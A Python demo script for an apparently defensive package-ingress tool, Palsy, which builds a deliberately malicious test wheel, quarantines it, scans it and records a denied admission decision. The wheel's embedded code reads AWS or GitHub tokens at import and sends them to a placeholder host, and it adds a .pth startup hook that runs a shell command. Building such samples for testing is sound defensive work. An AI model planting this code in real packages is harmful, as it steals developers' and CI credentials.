from __future__ import annotations

import argparse
import base64
import csv
import hashlib
import io
import json
import shutil
import zipfile
from pathlib import Path

from palsy.models import Ecosystem, Environment
from palsy.policy import PolicyConfig, PolicyContext, PolicyEngine
from palsy.scanner import StaticArtifactScanner


DEFAULT_OUT = Path(__file__).resolve().parent / "artefacts" / "five-minute-demo"


def main() -> None:
    parser = argparse.ArgumentParser(description="Run the 5-minute Palsy package-ingress demo")
    parser.add_argument("--out", type=Path, default=DEFAULT_OUT)
    args = parser.parse_args()

    result = run_demo(args.out)
    print("Palsy 5-minute demo: malicious package admission")
    print(f"1. Built malicious wheel: {result['wheel']}")
    print(f"2. Quarantined exact artefact: {result['quarantine_path']}")
    print(f"3. Static scan max severity: {result['max_severity']}")
    print(f"4. Policy decision: {result['decision'].upper()}")
    print("5. Review outcome: denied; no mirror promotion and no signed permit")
    print("")
    print("Decision reasons:")
    for reason in result["reasons"]:
        print(f"- {reason}")
    print("")
    print(f"Review record: {result['review_record']}")


def run_demo(out_dir: Path) -> dict[str, object]:
    out_dir.mkdir(parents=True, exist_ok=True)
    wheel = _write_malicious_wheel(out_dir / "credential_stealer_demo-0.1.0-py3-none-any.whl")
    digest = _sha256_file(wheel)
    quarantine_dir = out_dir / "quarantine"
    quarantine_dir.mkdir(parents=True, exist_ok=True)
    quarantine_path = quarantine_dir / f"{digest}.whl"
    shutil.copyfile(wheel, quarantine_path)

    scan = StaticArtifactScanner().scan(quarantine_path, digest=digest)
    decision = PolicyEngine(
        PolicyConfig(
            name="demo-package-ingress-policy",
            minimum_release_age_seconds={"default": 0, "ci": 0, "prod": 0},
        )
    ).evaluate(
        PolicyContext(
            project="credential-stealer-demo",
            version="0.1.0",
            environment=Environment.ci,
            scan=scan,
            ecosystem=Ecosystem.pypi,
        )
    )
    review = {
        "package": "credential-stealer-demo",
        "version": "0.1.0",
        "digest": digest,
        "quarantine_path": str(quarantine_path),
        "decision": decision.decision.value,
        "reviewer": "security",
        "review_outcome": "denied",
        "mirror_promotion": False,
        "signed_permit": None,
        "reasons": decision.reasons,
        "findings": [finding.model_dump(mode="json") for finding in scan.findings],
    }
    review_path = out_dir / "review-denied.json"
    review_path.write_text(json.dumps(review, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return {
        "wheel": str(wheel),
        "quarantine_path": str(quarantine_path),
        "review_record": str(review_path),
        "digest": digest,
        "max_severity": scan.max_severity.value,
        "decision": decision.decision.value,
        "reasons": decision.reasons,
    }


def _write_malicious_wheel(path: Path) -> Path:
    dist_info = "credential_stealer_demo-0.1.0.dist-info"
    files = {
        "credential_stealer_demo/__init__.py": (
            b"import os\n"
            b"import urllib.request\n"
            b"token = os.environ.get('AWS_SECRET_ACCESS_KEY') or os.environ.get('GITHUB_TOKEN')\n"
            b"if token:\n"
            b"    urllib.request.urlopen('https://collector.invalid/ingest?token=' + token, timeout=1)\n"
        ),
        "credential_stealer_demo_startup.pth": (
            b"import os; os.system('python -c \"print(\\\\\\\"startup hook executed\\\\\\\")\"')\n"
        ),
        f"{dist_info}/METADATA": (
            b"Metadata-Version: 2.1\n"
            b"Name: credential-stealer-demo\n"
            b"Version: 0.1.0\n"
            b"Summary: Demo package with import-time credential access\n"
        ),
        f"{dist_info}/WHEEL": (
            b"Wheel-Version: 1.0\n"
            b"Generator: palsy five-minute demo\n"
            b"Root-Is-Purelib: true\n"
            b"Tag: py3-none-any\n"
        ),
        f"{dist_info}/top_level.txt": b"credential_stealer_demo\n",
    }
    record_name = f"{dist_info}/RECORD"
    record_rows = io.StringIO()
    writer = csv.writer(record_rows, lineterminator="\n")
    for filename, data in sorted(files.items()):
        writer.writerow([filename, _record_hash(data), str(len(data))])
    writer.writerow([record_name, "", ""])
    files[record_name] = record_rows.getvalue().encode("utf-8")

    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as wheel:
        for filename, data in files.items():
            wheel.writestr(filename, data)
    return path


def _record_hash(data: bytes) -> str:
    digest = hashlib.sha256(data).digest()
    encoded = base64.urlsafe_b64encode(digest).decode("ascii").rstrip("=")
    return f"sha256={encoded}"


def _sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


if __name__ == "__main__":
    main()
